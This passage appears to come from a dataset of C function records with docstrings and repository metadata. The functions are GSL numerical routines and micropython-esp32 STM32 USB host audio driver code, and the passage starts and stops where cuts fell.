Ma0nm1 = (-n*(1-n-x)*Ma0n - x*(n-a0)*Ma0np1)/(n*(n-1.0));\n          Ma0np1 = Ma0n;\n          Ma0n = Ma0nm1;\n        }\n        Ma0bp1 = Ma0np1;\n        Ma0b   = Ma0n;\n        Ma0p1b = (b*(a0+x)*Ma0b+x*(a0-b)*Ma0bp1)/(a0*b); /* right-down hook */\n        stat_a0 = GSL_ERROR_SELECT_2(stat_0, stat_1);\n      }\n\n          \n      /* Initialise the recurrence correctly BJG */\n\n      if (a0 >= a - 0.1)\n        { \n          Mn = Ma0b;\n        }\n      else if (a0 + 1>= a - 0.1)\n        {\n          Mn = Ma0p1b;\n        }\n      else\n        {\n          Mnm1 = Ma0b;\n          Mn   = Ma0p1b;\n\n          for(n=a0+1.0; n<a-0.1; n += 1.0) {\n            Mnp1 = ((b-n)*Mnm1 + (2*n-b+x)*Mn)/n;\n            Mnm1 = Mn;\n            Mn   = Mnp1;\n          }\n        }\n\n      result->val = Mn;\n      result->err = (err_rat + GSL_DBL_EPSILON) * (fabs(b-a)+1.0) * fabs(Mn);\n      return stat_a0;\n    }\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Algorithm 8.4.3 - Cyclic Jacobi.  Golub & Van Loan, Matrix Computations */\n", "func_signal": "static inline double\nsymschur2 (gsl_matrix * A, size_t p, size_t q, double *c, double *s)", "code": "{\n  double Apq = gsl_matrix_get (A, p, q);\n\n  if (Apq != 0.0)\n    {\n      double App = gsl_matrix_get (A, p, p);\n      double Aqq = gsl_matrix_get (A, q, q);\n      double tau = (Aqq - App) / (2.0 * Apq);\n      double t, c1;\n\n      if (tau >= 0.0)\n        {\n          t = 1.0 / (tau + hypot (1.0, tau));\n        }\n      else\n        {\n          t = -1.0 / (-tau + hypot (1.0, tau));\n        }\n\n      c1 = 1.0 / hypot (1.0, t);\n\n      *c = c1;\n      *s = t * c1;\n    }\n  else\n    {\n      *c = 1.0;\n      *s = 0.0;\n    }\n\n  /* reduction in off(A) is 2*(A_pq)^2 */\n\n  return fabs (Apq);\n}", "path": "gsl/eigen/jacobi.c", "commit_date": "2012-08-31 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/**\n  * @brief  USBH_AUDIO_ChangeOutBuffer \n  *         Change audio data buffer address\n  * @param  phost: Host handle\n  * @param  buf: buffer address\n  * @retval USBH Status\n  */\n", "func_signal": "USBH_StatusTypeDef USBH_AUDIO_ChangeOutBuffer (USBH_HandleTypeDef *phost, uint8_t *buf)", "code": "{\n  USBH_StatusTypeDef Status = USBH_FAIL;\n  AUDIO_HandleTypeDef *AUDIO_Handle; \n  \n  if(phost->gState == HOST_CLASS)\n  {\n    AUDIO_Handle =  phost->pActiveClass->pData;\n    if(AUDIO_Handle->play_state == AUDIO_PLAYBACK_PLAY)\n    {\n      if(AUDIO_Handle->headphone.buf <= buf)\n      {\n        AUDIO_Handle->headphone.cbuf = buf;\n        if ( AUDIO_Handle->headphone.buf == buf)\n        {\n          AUDIO_Handle->headphone.partial_ptr = 0;\n        }\n        Status = USBH_OK;  \n      }    \n    }\n  }\n  return Status;  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Get Cur request\n  * @param  phost: Host handle\n  * @param  subtype: subtype index\n  * @param  feature: feature index\n  * @param  controlSelector: control code\n  * @param  channel: channel index\n  * @param  length: Command length\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AC_GetCur(USBH_HandleTypeDef *phost, \n                                         uint8_t subtype, \n                                         uint8_t feature,\n                                         uint8_t controlSelector,\n                                         uint8_t channel,\n                                         uint16_t length)", "code": "{\n  uint16_t wValue = 0, wIndex = 0,wLength = 0;\n  uint8_t UnitID = 0, InterfaceNum = 0;\n  AUDIO_HandleTypeDef *AUDIO_Handle;\n  AUDIO_Handle =  phost->pActiveClass->pData;\n  \n  switch(subtype)\n  {\n  case UAC_INPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ;\n    AUDIO_Handle->mem[0] = 0x00;\n    \n    wLength = 1;\n    break;\n  case UAC_FEATURE_UNIT:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.FeatureUnitDesc[feature]->bUnitID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    /*holds the CS(control selector ) and CN (channel number)*/\n    wValue =  (controlSelector << 8) | channel;\n    wLength = length;\n    break;\n    \n  case UAC_OUTPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.OutputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ; \n    wLength = 1; \n    break;\n  }\n  \n  phost->Control.setup.b.bmRequestType = USB_D2H | USB_REQ_RECIPIENT_INTERFACE | \\\n    USB_REQ_TYPE_CLASS;\n  \n  phost->Control.setup.b.bRequest = UAC_GET_CUR;\n  phost->Control.setup.b.wValue.w = wValue;\n  phost->Control.setup.b.wIndex.w = wIndex;\n  phost->Control.setup.b.wLength.w = wLength; \n  \n  return(USBH_CtlReq(phost, (uint8_t *)(AUDIO_Handle->mem) , wLength ));    \n  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Get Res request\n  * @param  phost: Host handle\n  * @param  subtype: subtype index\n  * @param  feature: feature index\n  * @param  controlSelector: control code\n  * @param  channel: channel index\n  * @param  length: Command length\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AC_GetRes(USBH_HandleTypeDef *phost, \n                                         uint8_t subtype, \n                                         uint8_t feature,\n                                         uint8_t controlSelector,\n                                         uint8_t channel,\n                                         uint16_t length)", "code": "{\n  uint16_t wValue = 0, wIndex = 0, wLength = 0;\n  uint8_t UnitID = 0, InterfaceNum = 0;\n  AUDIO_HandleTypeDef *AUDIO_Handle;\n  AUDIO_Handle =  phost->pActiveClass->pData;\n  \n  switch(subtype)\n  {\n  case UAC_INPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ;\n    AUDIO_Handle->mem[0] = 0x00;\n    \n    wLength = 1;\n    break;\n  case UAC_FEATURE_UNIT:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.FeatureUnitDesc[feature]->bUnitID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    /*holds the CS(control selector ) and CN (channel number)*/\n    wValue =  (controlSelector << 8) | channel;\n    wLength = length;\n    break;\n    \n  case UAC_OUTPUT_TERMINAL:\n    UnitID = AUDIO_Handle->class_desc.cs_desc.OutputTerminalDesc[0]->bTerminalID;\n    InterfaceNum = 0; /*Always zero Control Interface */\n    wIndex = ( UnitID << 8 ) | InterfaceNum ;\n    wValue = (COPY_PROTECT_CONTROL << 8 ) ; \n    wLength = 1; \n    break;\n  }\n  \n  phost->Control.setup.b.bmRequestType = USB_D2H | USB_REQ_RECIPIENT_INTERFACE | \\\n    USB_REQ_TYPE_CLASS;\n  \n  phost->Control.setup.b.bRequest = UAC_GET_RES;\n  phost->Control.setup.b.wValue.w = wValue;\n  phost->Control.setup.b.wIndex.w = wIndex;\n  phost->Control.setup.b.wLength.w = wLength; \n  \n  return(USBH_CtlReq(phost, (uint8_t *)(AUDIO_Handle->mem) , wLength ));    \n  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Build full path for Headphone device\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "USBH_StatusTypeDef USBH_AUDIO_BuildHeadphonePath(USBH_HandleTypeDef *phost)", "code": "{\n  uint8_t UnitID = 0, Type, Index;\n  uint32_t value;\n  uint8_t terminalIndex;  \n  AUDIO_HandleTypeDef *AUDIO_Handle;\n  \n  AUDIO_Handle =  phost->pActiveClass->pData;    \n  \n  /*Find association betwen audio streaming and microphone*/\n  for(terminalIndex = 0; terminalIndex < AUDIO_Handle->class_desc.InputTerminalNum; terminalIndex++)\n  {\n    if(LE16(AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[terminalIndex]->wTerminalType) == 0x101)\n    {    \n      UnitID = AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[terminalIndex]->bTerminalID;\n      AUDIO_Handle->headphone.asociated_channels =  AUDIO_Handle->class_desc.cs_desc.InputTerminalDesc[terminalIndex]->bNrChannels;\n      break;\n    }\n  }\n  \n  for(Index = 0; Index < AUDIO_Handle->class_desc.ASNum; Index++)\n  {\n    if(AUDIO_Handle->class_desc.as_desc[Index].GeneralDesc->bTerminalLink == UnitID)\n    {    \n      AUDIO_Handle->headphone.asociated_as = Index;\n      break;\n    }\n  } \n        \n  do\n  {\n    value =  USBH_AUDIO_FindLinkedUnit(phost, UnitID);\n    Index = value & 0xFF;\n    Type   = (value >> 8) & 0xFF;\n    UnitID   = (value >> 16) & 0xFF;\n    \n    switch (Type)\n    {\n    case UAC_FEATURE_UNIT:\n      AUDIO_Handle->headphone.asociated_feature = Index;\n      break;\n      \n    case UAC_MIXER_UNIT:\n      AUDIO_Handle->headphone.asociated_mixer = Index;\n      break;\n      \n    case UAC_SELECTOR_UNIT:\n      AUDIO_Handle->headphone.asociated_selector = Index;\n      break;\n      \n    case UAC_OUTPUT_TERMINAL:\n      AUDIO_Handle->headphone.asociated_terminal = Index;\n      if(LE16(AUDIO_Handle->class_desc.cs_desc.OutputTerminalDesc[Index]->wTerminalType) != 0x103)\n      {\n        return  USBH_OK;\n      }\n      break;    \n    }\n  }\n  while ((Type != UAC_OUTPUT_TERMINAL) && (value > 0));\n\n  return USBH_FAIL;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "//*****************************************************************************\n//\n//! \\brief Application defined stack overflow hook\n//!\n//! \\param  none\n//!\n//! \\return none\n//!\n//*****************************************************************************\n", "func_signal": "void vApplicationStackOverflowHook (OsiTaskHandle *pxTask, signed char *pcTaskName)", "code": "{\n#ifdef DEBUG\n    // Break into the debugger\n    __asm volatile (\"bkpt #0  \\n\");\n#endif\n\n    __fatal_error(\"Stack overflow!\");\n}", "path": "micropython-esp32/ports/cc3200/misc/FreeRTOSHooks.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/// \\function urandom(n)\n/// Return a bytes object with n random bytes, generated by the hardware\n/// random number generator.\n", "func_signal": "STATIC mp_obj_t os_urandom(mp_obj_t num)", "code": "{\n    mp_int_t n = mp_obj_get_int(num);\n    vstr_t vstr;\n    vstr_init_len(&vstr, n);\n    for (int i = 0; i < n; i++) {\n        vstr.buf[i] = rng_get();\n    }\n    return mp_obj_new_str_from_vstr(&mp_type_bytes, &vstr);\n}", "path": "micropython-esp32/ports/stm32/moduos.c", "commit_date": "2017-10-19 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  USBH_AUDIO_Resume \n  *         Resume the playback process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "USBH_StatusTypeDef USBH_AUDIO_Resume (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef Status = USBH_FAIL;\n  AUDIO_HandleTypeDef *AUDIO_Handle; \n  \n  if(phost->gState == HOST_CLASS)\n  {\n    AUDIO_Handle =  phost->pActiveClass->pData;\n    if(AUDIO_Handle->play_state == AUDIO_PLAYBACK_IDLE)\n    {\n      AUDIO_Handle->control_state = AUDIO_CONTROL_INIT;\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_PLAY;\n    }\n  }\n  return Status;  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Set Endpoint Controls Request\n  * @param  phost: Host handle\n  * @param  Ep: Endpoint address\n  * @param  buf: pointer to data\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_SetEndpointControls(USBH_HandleTypeDef *phost,\n                                               uint8_t  Ep,\n                                               uint8_t *buff)", "code": "{\n  uint16_t wValue, wIndex, wLength;\n  \n\n  wValue = SAMPLING_FREQ_CONTROL << 8;\n  wIndex = Ep; \n  wLength = 3; /*length of the frequency parameter*/   \n  \n  phost->Control.setup.b.bmRequestType = USB_H2D | USB_REQ_RECIPIENT_ENDPOINT | \\\n    USB_REQ_TYPE_CLASS;\n  \n  phost->Control.setup.b.bRequest = UAC_SET_CUR;\n  phost->Control.setup.b.wValue.w = wValue;\n  phost->Control.setup.b.wIndex.w = wIndex;\n  phost->Control.setup.b.wLength.w = wLength; \n  \n  return(USBH_CtlReq(phost, (uint8_t *)buff, wLength ));\n    \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  USBH_AUDIO_Suspend \n  *         Suspend the playback process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "USBH_StatusTypeDef USBH_AUDIO_Suspend (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef Status = USBH_FAIL;\n  AUDIO_HandleTypeDef *AUDIO_Handle; \n  \n  if(phost->gState == HOST_CLASS)\n  {\n    AUDIO_Handle =  phost->pActiveClass->pData;\n    if(AUDIO_Handle->play_state == AUDIO_PLAYBACK_PLAY)\n    {\n      AUDIO_Handle->control_state = AUDIO_CONTROL_IDLE;\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_IDLE;\n      Status = USBH_OK;      \n    }\n  }\n  return Status;  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  USBH_AUDIO_CSRequest \n  *         The function is responsible for handling AC Specific requests for a specific feature and channel\n  *         for Audio class.\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_CSRequest(USBH_HandleTypeDef *phost, uint8_t feature, uint8_t channel)", "code": "{   \n  AUDIO_HandleTypeDef *AUDIO_Handle =  phost->pActiveClass->pData;  \n  USBH_StatusTypeDef status = USBH_BUSY;\n  USBH_StatusTypeDef req_status = USBH_BUSY;\n  \n  /* Switch AUDIO REQ state machine */\n  switch (AUDIO_Handle->cs_req_state)\n  {\n  case AUDIO_REQ_GET_VOLUME:\n    req_status = USBH_AC_GetCur(phost,                 \n                                UAC_FEATURE_UNIT,     /* subtype  */\n                                feature,              /* feature  */\n                                VOLUME_CONTROL,       /* Selector */\n                                channel,              /* channel  */\n                                0x02);                /* length   */\n    if(req_status != USBH_BUSY)\n    {\n      AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_MIN_VOLUME;\n      AUDIO_Handle->headphone.attribute.volume = LE16(&(AUDIO_Handle->mem[0]));\n    }\n    break;\n    \n  case AUDIO_REQ_GET_MIN_VOLUME:\n    req_status = USBH_AC_GetMin(phost,                 \n                                UAC_FEATURE_UNIT,     /* subtype  */\n                                feature,              /* feature  */\n                                VOLUME_CONTROL,       /* Selector */\n                                channel,              /* channel  */\n                                0x02);                /* length   */\n    if(req_status != USBH_BUSY)\n    {\n      AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_MAX_VOLUME;\n      AUDIO_Handle->headphone.attribute.volumeMin = LE16(&AUDIO_Handle->mem[0]);\n    }\n    break;\n\n  case AUDIO_REQ_GET_MAX_VOLUME:\n    req_status = USBH_AC_GetMax(phost,                 \n                                UAC_FEATURE_UNIT,     /* subtype  */\n                                feature,              /* feature  */\n                                VOLUME_CONTROL,       /* Selector */\n                                channel,              /* channel  */\n                                0x02);                /* length   */\n    if(req_status != USBH_BUSY)\n    {\n      AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_RESOLUTION;\n      AUDIO_Handle->headphone.attribute.volumeMax = LE16(&AUDIO_Handle->mem[0]);   \n      \n      if (AUDIO_Handle->headphone.attribute.volumeMax < AUDIO_Handle->headphone.attribute.volumeMin)\n      {\n        AUDIO_Handle->headphone.attribute.volumeMax = 0xFF00; \n      }\n    }\n    break;\n    \n  case AUDIO_REQ_GET_RESOLUTION:\n    req_status = USBH_AC_GetRes(phost,                 \n                                UAC_FEATURE_UNIT,     /* subtype  */\n                                feature,              /* feature  */\n                                VOLUME_CONTROL,       /* Selector */\n                                channel,              /* channel  */\n                                0x02);                /* length   */\n    if(req_status != USBH_BUSY)\n    {\n      AUDIO_Handle->cs_req_state = AUDIO_REQ_CS_IDLE;\n      AUDIO_Handle->headphone.attribute.resolution = LE16(&AUDIO_Handle->mem[0]);    \n    }\n    break;\n    \n \n  case AUDIO_REQ_CS_IDLE:\n    status = USBH_OK;\n  default:\n    break;\n  }\n  return status; \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Input stream process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_InputStream (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef status = USBH_BUSY ; \n  \n  return status;  \n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Transmission process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_Transmit (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef status = USBH_BUSY ;\n  AUDIO_HandleTypeDef *AUDIO_Handle =  phost->pActiveClass->pData;   \n  \n  switch(AUDIO_Handle->processing_state)\n  {\n  case AUDIO_DATA_START_OUT:\n    /* Sync with start of Even Frame */\n    if((phost->Timer & 1) == 0)\n    {\n      AUDIO_Handle->headphone.timer = phost->Timer;\n      AUDIO_Handle->processing_state = AUDIO_DATA_OUT;\n      USBH_IsocSendData(phost, \n                       AUDIO_Handle->headphone.buf,\n                       AUDIO_Handle->headphone.frame_length,\n                       AUDIO_Handle->headphone.Pipe);\n      \n      AUDIO_Handle->headphone.partial_ptr = AUDIO_Handle->headphone.frame_length; \n      AUDIO_Handle->headphone.global_ptr = AUDIO_Handle->headphone.frame_length; \n      AUDIO_Handle->headphone.cbuf = AUDIO_Handle->headphone.buf;\n\n    }\n    break;\n    \n  case AUDIO_DATA_OUT:\n    if((USBH_LL_GetURBState(phost , AUDIO_Handle->headphone.Pipe) == USBH_URB_DONE)&&\n       (( phost->Timer - AUDIO_Handle->headphone.timer) >= AUDIO_Handle->headphone.Poll))\n    {\n      AUDIO_Handle->headphone.timer = phost->Timer;\n      \n      if(AUDIO_Handle->control.supported == 1)\n      {\n        USBH_AUDIO_Control (phost);\n      }\n      \n      if(AUDIO_Handle->headphone.global_ptr <= AUDIO_Handle->headphone.total_length)\n      {\n        USBH_IsocSendData(phost, \n                          AUDIO_Handle->headphone.cbuf,\n                          AUDIO_Handle->headphone.frame_length,\n                          AUDIO_Handle->headphone.Pipe);\n        \n        AUDIO_Handle->headphone.cbuf += AUDIO_Handle->headphone.frame_length;\n        AUDIO_Handle->headphone.partial_ptr += AUDIO_Handle->headphone.frame_length;\n        AUDIO_Handle->headphone.global_ptr += AUDIO_Handle->headphone.frame_length;\n      }\n      else\n      {\n       AUDIO_Handle->headphone.partial_ptr = 0xFFFFFFFF;\n       AUDIO_Handle->play_state = AUDIO_PLAYBACK_IDLE;\n      }\n    }\n    break;\n  }\n  return status;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Find IN Audio Streaming interfaces\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_FindAudioStreamingIN(USBH_HandleTypeDef *phost)", "code": "{\n  uint8_t interface, alt_settings;\n  USBH_StatusTypeDef status = USBH_FAIL ;\n  AUDIO_HandleTypeDef *AUDIO_Handle;\n\n  AUDIO_Handle =  phost->pActiveClass->pData; \n\n  /* Look For AUDIOSTREAMING IN interface */\n  alt_settings = 0;\n  for (interface = 0;  interface < USBH_MAX_NUM_INTERFACES ; interface ++ )\n  {\n    if((phost->device.CfgDesc.Itf_Desc[interface].bInterfaceClass == AC_CLASS)&&\n       (phost->device.CfgDesc.Itf_Desc[interface].bInterfaceSubClass == USB_SUBCLASS_AUDIOSTREAMING))\n    {\n      if((phost->device.CfgDesc.Itf_Desc[interface].Ep_Desc[0].bEndpointAddress & 0x80)&&\n         (phost->device.CfgDesc.Itf_Desc[interface].Ep_Desc[0].wMaxPacketSize > 0))\n      {\n        AUDIO_Handle->stream_in[alt_settings].Ep = phost->device.CfgDesc.Itf_Desc[interface].Ep_Desc[0].bEndpointAddress;\n        AUDIO_Handle->stream_in[alt_settings].EpSize = phost->device.CfgDesc.Itf_Desc[interface].Ep_Desc[0].wMaxPacketSize;\n        AUDIO_Handle->stream_in[alt_settings].interface = phost->device.CfgDesc.Itf_Desc[interface].bInterfaceNumber;        \n        AUDIO_Handle->stream_in[alt_settings].AltSettings = phost->device.CfgDesc.Itf_Desc[interface].bAlternateSetting;\n        AUDIO_Handle->stream_in[alt_settings].Poll = phost->device.CfgDesc.Itf_Desc[interface].Ep_Desc[0].bInterval;   \n        AUDIO_Handle->stream_in[alt_settings].valid = 1; \n        alt_settings++;\n      }\n    }\n  } \n  \n  if(alt_settings > 0)\n  {  \n     status = USBH_OK;\n  }\n  \n  return status;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Parse AC interfaces\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef ParseCSDescriptors(AUDIO_ClassSpecificDescTypedef *class_desc, \n                                      uint8_t ac_subclass, \n                                      uint8_t *pdesc)", "code": "{\n  if(ac_subclass == USB_SUBCLASS_AUDIOCONTROL)\n  {\n    switch(pdesc[2])\n    {\n    case UAC_HEADER: \n      class_desc->cs_desc.HeaderDesc = (AUDIO_HeaderDescTypeDef *)pdesc;    \n      break;\n      \n    case UAC_INPUT_TERMINAL:\n      class_desc->cs_desc.InputTerminalDesc[class_desc->InputTerminalNum++] = (AUDIO_ITDescTypeDef*) pdesc;    \n      break;\n      \n    case UAC_OUTPUT_TERMINAL:\n      class_desc->cs_desc.OutputTerminalDesc[class_desc->OutputTerminalNum++] = (AUDIO_OTDescTypeDef*) pdesc;   \n      break;\n\n    case UAC_FEATURE_UNIT:\n      class_desc->cs_desc.FeatureUnitDesc[class_desc->FeatureUnitNum++] = (AUDIO_FeatureDescTypeDef*) pdesc; \n      break;\n      \n    case UAC_SELECTOR_UNIT:\n      class_desc->cs_desc.SelectorUnitDesc[class_desc->SelectorUnitNum++] = (AUDIO_SelectorDescTypeDef*) pdesc; \n      break;\n\n    case UAC_MIXER_UNIT:\n      class_desc->cs_desc.MixerUnitDesc[class_desc->MixerUnitNum++] = (AUDIO_MixerDescTypeDef*) pdesc; \n      break;      \n\n    default: \n      break;\n    }\n  }\n  else if(ac_subclass == USB_SUBCLASS_AUDIOSTREAMING)\n  {\n    switch(pdesc[2])\n    {\n    case UAC_AS_GENERAL:\n      class_desc->as_desc[class_desc->ASNum].GeneralDesc = (AUDIO_ASGeneralDescTypeDef*) pdesc; \n      break;\n    case UAC_FORMAT_TYPE:      \n      class_desc->as_desc[class_desc->ASNum++].FormatTypeDesc = (AUDIO_ASFormatTypeDescTypeDef*) pdesc; \n      break;\n    default:\n      break;\n    }\n  }\n \n  return USBH_OK;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  USBH_AUDIO_SetControlAttribute \n  *         Set Control Attribute\n  * @param  phost: Host handle\n  * @param  attrib: control attribute\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_SetControlAttribute (USBH_HandleTypeDef *phost, uint8_t attrib)", "code": "{\n  USBH_StatusTypeDef status = USBH_BUSY ;\n  AUDIO_HandleTypeDef *AUDIO_Handle; \n\n  \n  AUDIO_Handle = phost->pActiveClass->pData;\n  \n  switch (attrib)\n  {\n  case 0x01:\n    AUDIO_Handle->headphone.attribute.volume += AUDIO_Handle->headphone.attribute.resolution;\n    break;\n    \n  case 0x02:\n    AUDIO_Handle->headphone.attribute.volume -= AUDIO_Handle->headphone.attribute.resolution; \n    break;\n    \n  }\n  \n  if(AUDIO_Handle->headphone.attribute.volume > AUDIO_Handle->headphone.attribute.volumeMax)\n  {\n    AUDIO_Handle->headphone.attribute.volume =AUDIO_Handle->headphone.attribute.volumeMax;\n  }\n  \n  if(AUDIO_Handle->headphone.attribute.volume < AUDIO_Handle->headphone.attribute.volumeMin)\n  {\n    AUDIO_Handle->headphone.attribute.volume =AUDIO_Handle->headphone.attribute.volumeMin;\n  }\n  \n  if(AUDIO_SetVolume (phost, \n                                 AUDIO_Handle->temp_feature, \n                                 AUDIO_Handle->temp_channels, \n                                 AUDIO_Handle->headphone.attribute.volume) != USBH_BUSY)\n  {\n    \n    if(AUDIO_Handle->temp_channels ==  1)\n    {\n      AUDIO_Handle->temp_feature  = AUDIO_Handle->headphone.asociated_feature;\n      AUDIO_Handle->temp_channels = AUDIO_Handle->headphone.asociated_channels;\n      status = USBH_OK;\n    }\n    else\n    {\n      AUDIO_Handle->temp_channels--;\n    }\n    AUDIO_Handle->cs_req_state = AUDIO_REQ_GET_VOLUME;\n  }\n  \n \n  return status;\n}", "path": "micropython-esp32/ports/stm32/usbhost/Class/AUDIO/Src/usbh_audio.c", "commit_date": "2017-09-06 00:00:00", "repo_name": "micropython/micropython-esp32", "stars": 663, "license": "mit", "language": "c", "size": 31157}
{"docstring": "/**\n  * @brief  Handle Output stream process\n  * @param  phost: Host handle\n  * @retval USBH Status\n  */\n", "func_signal": "static USBH_StatusTypeDef USBH_AUDIO_OutputStream (USBH_HandleTypeDef *phost)", "code": "{\n  USBH_StatusTypeDef status = USBH_BUSY ;\n  AUDIO_HandleTypeDef *AUDIO_Handle =  phost->pActiveClass->pData;   \n  uint8_t *buff;\n  \n  \n  switch(AUDIO_Handle->play_state)\n  {\n  case AUDIO_PLAYBACK_INIT:\n    \n    if( AUDIO_Handle->class_desc.as_desc[AUDIO_Handle->headphone.asociated_as].FormatTypeDesc->bSamFreqType == 0)\n    {\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_SET_EP_FREQ;        \n    }\n    else\n    {\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_SET_EP;\n    }\n#if (USBH_USE_OS == 1)\n      osMessagePut ( phost->os_event, USBH_URB_EVENT, 0);\n#endif  \n    break;\n    \n  case AUDIO_PLAYBACK_SET_EP_FREQ:\n\n    buff = (uint8_t*)AUDIO_Handle->class_desc.as_desc[AUDIO_Handle->headphone.asociated_as].FormatTypeDesc->tSamFreq[0];    \n\n    status = USBH_AUDIO_SetEndpointControls(phost, AUDIO_Handle->headphone.Ep, buff);\n    if(status == USBH_OK) \n    {\n      AUDIO_Handle->play_state = AUDIO_PLAYBACK_IDLE;    \n    }\n    